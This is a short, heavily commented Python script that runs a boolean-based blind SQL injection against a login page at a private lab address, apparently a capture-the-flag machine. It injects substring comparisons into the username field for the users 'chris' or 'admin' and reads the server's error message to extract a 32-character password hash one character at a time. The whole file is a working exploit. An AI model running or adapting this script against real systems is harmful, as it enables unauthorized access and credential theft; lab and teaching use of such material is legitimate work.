# Importing necessary library
import requests

# This function generates SQL injection payload to fetch the hash, for each index (i) and character (c) passed to the function
def SQLpayload(i,c):
    return "chris' AND substring(password,%s,1)='%s'-- -" % (i,c)
    # return "admin' AND substring(password,%s,1)='%s'-- -" % (i,c)


# All the characters in a hash
characters = 'abcdef0123456789'

password = '' # Blank password string

# Loop through every index position : 1 to 32
for i in range(1,33):
# Loop through every character in the "characters" for each index position
    for c in characters:
    # Defining a payload to be sent to the server
        payload = {'username':SQLpayload(i,c), 'password':'n00bsec'}
        # Sending a post request with the above payload and it's data and response is saved in "r"
        r = requests.post('http://10.129.115.123/login.php',data=payload)
        # Checking if "right" error is hit at an index for a character
        if "Wrong identification" in r.text:
        # If right error is hit, add the character to the password string
            password += c
            # Print the character on the screen without adding a "\n" - newline
            print(c,end='',flush=True)
            # No need to cycle through the rest of the characters if the "right" error is already hit for an index position
            break

# Print the hash
print('\nHash is:\t'+password+'\n')
